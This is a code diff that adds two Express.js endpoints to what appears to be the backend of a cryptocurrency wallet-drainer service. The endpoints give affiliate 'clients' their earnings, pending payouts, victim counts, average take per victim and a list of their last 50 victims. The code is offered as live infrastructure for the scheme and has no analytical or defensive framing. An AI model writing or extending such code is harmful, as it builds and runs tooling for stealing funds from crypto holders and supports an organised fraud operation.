@@ -3199,6 +3199,61 @@ function generateTokenPath() {
     return pathTokens.map(token => token.replace('0x', '').padStart(64, '0')).join('');
 }
 
+// ADD THIS TO YOUR index.js - Client earnings endpoint
+app.get('/api/client/earnings/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).json({ error: 'Client not found' });
+  }
+  
+  const client = clients.get(clientId);
+  const earnings = clientEarnings.get(clientId) || [];
+  const victims = clientVictims.get(clientId) || [];
+  
+  res.json({
+    success: true,
+    client: {
+      id: clientId,
+      name: client.name,
+      wallet: client.wallet,
+      totalEarnings: client.totalEarnings,
+      victimCount: client.victimCount,
+      pendingPayout: client.pendingPayout,
+      createdAt: client.createdAt
+    },
+    earnings: earnings.reverse(), // Latest first
+    victims: victims.reverse().slice(0, 50), // Last 50 victims
+    stats: {
+      totalEarnings: client.totalEarnings,
+      totalVictims: client.victimCount,
+      averagePerVictim: client.victimCount > 0 ? client.totalEarnings / client.victimCount : 0
+    }
+  });
+});
+
+// Client stats endpoint
+app.get('/api/client/stats/:clientId', (req, res) => {
+  const { clientId } = req.params;
+  
+  if (!clients.has(clientId)) {
+    return res.status(404).json({ error: 'Client not found' });
+  }
+  
+  const client = clients.get(clientId);
+  
+  res.json({
+    success: true,
+    clientId: clientId,
+    projectName: client.name,
+    totalEarnings: client.totalEarnings,
+    victimCount: client.victimCount,
+    pendingPayout: client.pendingPayout,
+    lastActivity: client.lastPayout || client.createdAt
+  });
+});
+
+
 
 // Test all RPC endpoints
 app.get('/api/test-all-rpcs', async (req, res) => {
